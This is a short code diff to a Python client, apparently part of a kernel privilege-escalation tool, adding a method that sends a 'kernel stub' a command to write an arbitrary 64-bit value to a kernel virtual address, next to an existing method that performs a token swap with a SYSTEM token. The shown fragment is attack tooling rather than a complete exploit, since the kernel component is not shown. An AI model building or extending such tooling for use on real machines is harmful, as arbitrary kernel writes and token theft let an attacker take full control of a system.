@@ -71,6 +71,22 @@ class NandoClient:
             
         raise Exception("[-] Command timed out")
 
+    def write_virtual(self, target_kva, value):
+        """
+        Uses Command 0x02 in the kernel stub to perform a virtual memory write.
+        target_kva: The KVA of the memory to write to.
+        value: The 64-bit value to write.
+        """
+        print(f"[*] Executing Write Virtual Command (Kernel Side)...")
+        print(f"[*] Target KVA: 0x{target_kva:X}")
+        print(f"[*] Value: 0x{value:X}")
+        
+        status, _ = self.send_command(2, target_kva, value)
+        if status == 0:
+            print("[+] Kernel command SUCCESS!")
+        else:
+            print(f"[-] Kernel command FAILED with status: {status}")
+
     def perform_token_swap(self, target_kva, system_token):
         """
         Uses Command 0x03 in the kernel stub to perform a token swap.
